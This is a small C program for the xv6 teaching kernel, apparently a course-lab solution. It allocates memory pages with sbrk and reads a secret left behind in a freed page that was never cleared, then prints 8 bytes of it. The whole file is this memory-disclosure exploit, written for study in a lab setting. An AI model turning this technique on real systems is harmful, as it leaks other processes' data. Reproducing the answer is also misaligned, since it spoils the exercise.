#include "kernel/types.h"
#include "user/user.h"

#define PGSIZE 4096

int main() {
    // 分配足够多的内存页，确保覆盖到secret释放的页
    char *p = sbrk(17 * PGSIZE);  // 分配17页（覆盖secret的第10页）
    if (p == (char*)-1) {
        fprintf(2, "sbrk failed\n");
        exit(1);
    }

    // 定位到第16页的起始地址（跳过attack自身分配的页）
    char *secret_page = p + 16 * PGSIZE;

    // 读取secret（偏移32字节处，避免覆盖栈指针）
    write(2, secret_page + 32, 8);  // 输出8字节secret
    exit(0);
}